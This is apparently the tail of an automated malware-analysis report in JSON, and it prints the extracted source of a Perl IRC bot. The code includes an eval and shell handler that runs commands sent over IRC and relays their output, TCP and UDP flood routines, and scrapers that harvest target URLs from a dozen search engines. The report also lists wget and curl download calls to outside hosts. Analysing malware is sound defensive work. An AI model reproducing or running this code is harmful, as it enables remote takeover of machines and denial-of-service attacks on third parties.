            "   if ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "         msg(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^ctcp\\s+(\\S+) (.*)/) {",
            "      ctcp(\"$1\", \"$2\");",
            "   }",
            "   if ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {",
            "      for (my $cf = 1; $cf <= $1; $cf++) {",
            "         ctcp(\"$2\", \"$3\");",
            "      }",
            "   }",
            "   if ($case =~ /^nick (.*)/) {",
            "      nick(\"$1\");",
            "   }",
            "   if ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {",
            "      conectar(\"$2\", \"$1\", 6667);",
            "   }",
            "   if ($case =~ /^raw (.*)/) {",
            "      sendraw(\"$1\");",
            "   }",
            "   if ($case =~ /^eval (.*)/) {",
            "      eval \"$1\";",
            "   }",
            "sub get_html() {",
            "$test=$_[0];",
            "      $ip=$_[1];",
            "      $port=$_[2];",
            "my $req=HTTP::Request->new(GET=>$test);",
            "my $ua=LWP::UserAgent->new();",
            "if(defined($ip) && defined($port)) {",
            "      $ua->proxy(\"http\",\"http://$ip:$port/\");",
            "      $ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");",
            "$ua->timeout(1);",
            "my $response=$ua->request($req);",
            "if ($response->is_success) {",
            "   $re=$response->content;",
            "return $re;",
            "sub addproc {",
            "   my $proc=$_[0];",
            "   my $dork=$_[1];",
            "   open(FILE,\">>/var/tmp/pids\");",
            "   print FILE $proc.\" [\".$irc_servers{$IRC_cur_socket}{'nick'}.\"] $dork\\n\";",
            "   close(FILE);",
            "sub delproc {",
            "   my $proc=$_[0];",
            "   open(FILE,\"/var/tmp/pids\");",
            "   while(<FILE>) {",
            "      $_ =~ /(\\d+)\\s+(.*)/;",
            "      $childs{$1}=$2;",
            "   }",
            "   close(FILE);",
            "   delete($childs{$proc});",
            "   open(FILE,\">/var/tmp/pids\");",
            "   for $klucz (keys %childs) {",
            "      print FILE $klucz.\" \".$childs{$klucz}.\"\\n\";",
            "   }",
            "sub shell {",
            "   my $printl=$_[0];",
            "   my $comando=$_[1];",
            "   if ($comando =~ /cd (.*)/) {",
            "      chdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");",
            "      return;",
            "   } elsif ($pid = fork) {",
            "      waitpid($pid, 0);",
            "   } else {",
            "      if (fork) {",
            "         exit;",
            "      } else {",
            "         my @resp=`$comando 2>&1 3>&1`;",
            "         my $c=0;",
            "         foreach my $linha (@resp) {",
            "            $c++;",
            "            chop $linha;",
            "            sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");",
            "            if ($c == \"$linas_max\") {",
            "               $c=0;",
            "               sleep $sleep;",
            "            }",
            "         }",
            "         exit;",
            "      }",
            "   }",
            "sub tcpflooder {",
            "   my $itime = time;",
            "   my ($cur_time);",
            "   my ($ia,$pa,$proto,$j,$l,$t);",
            "   $ia=inet_aton($_[0]);",
            "   $pa=sockaddr_in($_[1],$ia);",
            "   $ftime=$_[2];",
            "   $proto=getprotobyname('tcp');",
            "   $j=0;$l=0;",
            "   $cur_time = time - $itime;",
            "   while ($l<1000){",
            "      $cur_time = time - $itime;",
            "      last if $cur_time >= $ftime;",
            "      $t=\"SOCK$l\";",
            "      socket($t,PF_INET,SOCK_STREAM,$proto);",
            "      connect($t,$pa)||$j--;",
            "      $j++;",
            "      $l++;",
            "   }",
            "   $l=0;",
            "   while ($l<1000){",
            "      $cur_time = time - $itime;",
            "      last if $cur_time >= $ftime;",
            "      $t=\"SOCK$l\";",
            "      shutdown($t,2);",
            "      $l++;",
            "   }",
            "sub udpflooder {",
            "   my $iaddr = inet_aton($_[0]);",
            "   my $msg = 'A' x $_[1];",
            "   my $ftime = $_[2];",
            "   my $cp = 0;",
            "   my (%pacotes);",
            "   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;",
            "   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;",
            "   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;",
            "   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;",
            "   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;",
            "   return(undef) if $cp == 4;",
            "   my $itime = time;",
            "   my ($cur_time);",
            "   while ( 1 ) {",
            "      for (my $porta = 1; $porta <= 65000; $porta++) {",
            "         $cur_time = time - $itime;",
            "         last if $cur_time >= $ftime;",
            "         send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;",
            "         send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;",
            "         send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;",
            "         send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;",
            "         for (my $pc = 3; $pc <= 255;$pc++) {",
            "            next if $pc == 6;",
            "            $cur_time = time - $itime;",
            "            last if $cur_time >= $ftime;",
            "            socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;",
            "            send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;",
            "         }",
            "      }",
            "      last if $cur_time >= $ftime;",
            "   }",
            "   return($cur_time, %pacotes);",
            "sub ctcp {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");",
            "sub msg {",
            "   return unless $#_ == 1;",
            "   sendraw(\"PRIVMSG $_[0] :$_[1]\");",
            "sub notice {",
            "   return unless $#_ == 1;",
            "   sendraw(\"NOTICE $_[0] :$_[1]\");",
            "sub op {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] +o $_[1]\");",
            "sub deop {",
            "   return unless $#_ == 1;",
            "   sendraw(\"MODE $_[0] -o $_[1]\");",
            "sub j {",
            "   &join(@_);",
            "sub join {",
            "   return unless $#_ == 0;",
            "   sendraw(\"JOIN $_[0]\");",
            "sub p {",
            "   part(@_);",
            "sub part {",
            "   sendraw(\"PART $_[0]\");",
            "sub nick {",
            "   return unless $#_ == 0;",
            "   sendraw(\"NICK $_[0]\");",
            "sub quit {",
            "   sendraw(\"QUIT :$_[0]\");",
            "sub ubah {",
            "my $ganti  = $_[0];",
            "   $ganti  =~ s/\\./-/g;",
            "   $ganti  =~ s/www.//g;",
            "   return $ganti;",
            "sub fetch(){",
            "   my $rnd=(int(rand(9999)));",
            "   my $n= 80;",
            "   if ($rnd<5000) {",
            "      $n<<=1;",
            "   }",
            "   my $s= (int(rand(10)) * $n);",
            "   my @dominios = (\"removed-them-all\");",
            "   my @str;",
            "   foreach $dom  (@dominios){",
            "      push (@str,\"@gstring\");",
            "   }",
            "   my $query=\"www.google.com/search?q=\";",
            "   $query.=$str[(rand(scalar(@str)))];",
            "   $query.=\"&num=$n&start=$s\";",
            "   my @lst=();",
            "   sendraw(\"privmsg #debug :DEBUG only test googling: \".$query.\"\");",
            "   my $page = http_query($query);",
            "   while ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"? class=l>/g){",
            "      if ($1 !~ m/google|cache|translate/){",
            "         push (@lst,$1);",
            "      }",
            "   }",
            "   return (@lst);",
            "sub yahoo(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=100){",
            "my $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);",
            "my $Res=query($Ya);",
            "while($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/<b>//g;",
            "$k=~s/<\\/b>//g;",
            "$k=~s/<wbr>//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub msn(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $msn=(\"http://search.msn.de/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PORE\");",
            "my $Res=query($msn);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if($1 !~ /msn|live/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub lycos(){",
            "my $inizio=0;",
            "my $pagine=20;",
            "my $key=$_[0];",
            "my $av=0;",
            "my @lst;",
            "while($inizio <= $pagine){",
            "my $lycos=\"http://search.lycos.com/?query=\".key($key).\"&page=$av\";",
            "my $Res=query($lycos);",
            "while ($Res=~ m/<span class=\\\"?grnLnk small\\\"?>http:\\/\\/(.+?)\\//g ){",
            "my $k=\"$1\";",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "$inizio++;",
            "$av++;",
            "return @lst;",
            "#####",
            "sub aol(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=100;$b++){",
            "my $AoL=(\"http://search.aol.com/aol/search?query=\".key($key).\"&page=\".$b.\"&nt=null&ie=UTF-8\");",
            "my $Res=query($AoL);",
            "while($Res =~ m/<p class=\\\"deleted\\\" property=\\\"f:url\\\">http:\\/\\/(.+?)\\<\\/p>/g){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "sub ask(){",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=10)",
            "my $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");",
            "my $Res=query($Ask);",
            "while($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){",
            "my $k=$3;",
            "$k=~s/[\\\"\\ ]//g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "sub alltheweb()",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=1000; $i+=100)",
            "my $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);",
            "my $Res=query($all);",
            "while($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){",
            "my $k=$1;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub google(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=100;$b+=100){",
            "my $Go=(\"http://www.google.it/search?hl=it&q=\".key($key).\"&num=100&filter=0&start=\".$b);",
            "my $Res=query($Go);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /google/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS SEARCH",
            "#####",
            "sub search(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=100){",
            "my $ser=(\"http://www.search.com/search?q=\".key($key).\"\".$b);",
            "my $Res=query($ser);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# SUBS FireBall",
            "#####",
            "sub fireball(){",
            "my $key=$_[0];",
            "my $inicio=1;",
            "my $pagina=200;",
            "my @lst;",
            "my $av=0;",
            "while($inicio <= $pagina){",
            "my $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";",
            "my $Res=query($fireball);",
            "while ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=\"$1/\";",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "$av=$av+10;",
            "$inicio++;",
            "return @lst;",
            "#####",
            "# SUBS UOL",
            "#####",
            "sub uol(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $UoL=(\"http://busca.uol.com.br/www/index.html?q=\".key($key).\"&start=\".$i);",
            "my $Res=query($UoL);",
            "while($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){",
            "my $k=$1;",
            "if($k!~/busca|uol|yahoo/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# Altavista",
            "#####",
            "sub altavista(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $AlT=(\"http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);",
            "my $Res=query($AlT);",
            "while($Res=~m/<span class=ngrn>(.+?)\\//g){",
            "if($1 !~ /altavista/){",
            "my $k=$1;",
            "$k=~s/<//g;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub altavistade(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $AlT=(\"http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);",
            "my $Res=query($AlT);",
            "while($Res=~m/<span class=ngrn>(.+?)\\//g){",
            "if($1 !~ /altavista/){",
            "my $k=$1;",
            "$k=~s/<//g;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub altavistaus(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=1;$b<=1000;$b+=10){",
            "my $AlT=(\"http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b);",
            "my $Res=query($AlT);",
            "while($Res=~m/<span class=ngrn>(.+?)\\//g){",
            "if($1 !~ /altavista/){",
            "my $k=$1;",
            "$k=~s/<//g;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# Hotcox",
            "#####",
            "sub hotcox(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=100){",
            "my $hot=(\"http://search.hotcox.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=hb_loc&enc=utf-8\".$b);",
            "my $Res=query($hot);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# Mamma",
            "#####",
            "sub mamma(){",
            "my @lst;",
            "my $key = $_[0];",
            "for($b=0;$b<=1000;$b+=100){",
            "my $mam=(\"http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=\".key($key).\"\".$b);",
            "my $Res=query($mam);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){",
            "if ($1 !~ /msn|live|google|yahoo/){",
            "my $k=$1;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "#####",
            "# Mozcox",
            "#####",
            "sub mozcox()",
            "my @lst;",
            "my $key=$_[0];",
            "my $i=0;",
            "my $pg=0;",
            "for($i=0; $i<=100; $i+=1){",
            "my $mozcox=(\"http://www.mozcox.fr/search?q=\".key($key).\"&st=int&page=\".$i);",
            "my $Res=query($mozcox);",
            "while($Res =~ m/<a href=\\\"?http:\\/\\/(.+?)\\\" target/g){",
            "my $k=$1;",
            "$k=~s/ //g;",
            "my @grep=links($k);",
            "push(@lst,@grep);",
            "return @lst;",
            "sub links()",
            "my @l;",
            "my $link=$_[0];",
            "my $host=$_[0];",
            "my $hdir=$_[0];",
            "$hdir=~s/(.*)\\/[^\\/]*$/\\1/;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$host.=\"/\";",
            "$link.=\"/\";",
            "$hdir.=\"/\";",
            "$host=~s/\\/\\//\\//g;",
            "$hdir=~s/\\/\\//\\//g;",
            "$link=~s/\\/\\//\\//g;",
            "push(@l,$link,$host,$hdir);",
            "return @l;",
            "sub geths(){",
            "my $host=$_[0];",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "return $host;",
            "sub key(){",
            "my $chiave=$_[0];",
            "$chiave =~ s/ /\\+/g;",
            "$chiave =~ s/:/\\%3A/g;",
            "$chiave =~ s/\\//\\%2F/g;",
            "$chiave =~ s/&/\\%26/g;",
            "$chiave =~ s/\\\"/\\%22/g;",
            "$chiave =~ s/,/\\%2C/g;",
            "$chiave =~ s/\\\\/\\%5C/g;",
            "return $chiave;",
            "sub query($){",
            "my $url=$_[0];",
            "$url=~s/http:\\/\\///;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host=~s/href=\\\"?http:\\/\\///;",
            "$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query=~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "close($sock);",
            "return $page;",
            "sub unici{",
            "my @unici = ();",
            "my %visti = ();",
            "foreach my $elemento ( @_ )",
            "next if $visti{ $elemento }++;",
            "push @unici, $elemento;",
            "}   ",
            "return @unici;",
            "sub http_query($){",
            "my ($url) = @_;",
            "my $host=$url;",
            "my $query=$url;",
            "my $page=\"\";",
            "$host =~ s/href=\\\"?http:\\/\\///;",
            "$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "$query =~s/$host//;",
            "if ($query eq \"\") {$query=\"/\";};",
            "eval {",
            "local $SIG{ALRM} = sub { die \"1\";};",
            "alarm 10;",
            "my $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "print $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";",
            "my @r = <$sock>;",
            "$page=\"@r\";",
            "alarm 0;",
            "close($sock);",
            "return $page;"
        ],
        "file": {
            "      #http://ttl.ugu.pl/string/index.php": "Web Page"
        },
        "fuzzing": {
            "Possible connections": [
                "      system 'wget http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz';",
                "      system 'curl -O http://andromeda.covers.de/221/mocks.conf';"
            ]
        },
        "ip": [],
        "url": [
            "http://www.mamma.com/Mamma?utfout=av&qtype=0&query=",
            "http://www.milw0rm.com/exploits/1",
            "http://switch.dl.sourceforge.net/sourceforge/mocks/mocks-0.0.2.tar.gz",
            "http://ip:port/",
            "http://search.yahoo.com/search?ei=UTF-8&p=",
            "http://milw0rm.com/rss.php",
            "http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=",
            "http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=",
            "http://www.google.it/search?hl=it&q=",
            "http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=",
            "http://search.lycos.com/?query=",
            "http://www.search.com/search?q=",
            "http://search.msn.de/results.aspx?q=",
            "http://suche.fireball.de/cgi-bin/pursuit?pag=av&query=",
            "http://busca.uol.com.br/www/index.html?q=",
            "http://",
            "http://andromeda.covers.de/221/mocks.conf",
            "http://www.mozcox.fr/search?q=",
            "http://ttl.ugu.pl/string/index.php",
            "http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=",
            "http://search.hotcox.de/cgi-bin/pursuit?pag=av&query=",
            "http://search.aol.com/aol/search?query=",
            "http://it.ask.com/web?q="
        ]
    },
    "time": "0:00:00.795236",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
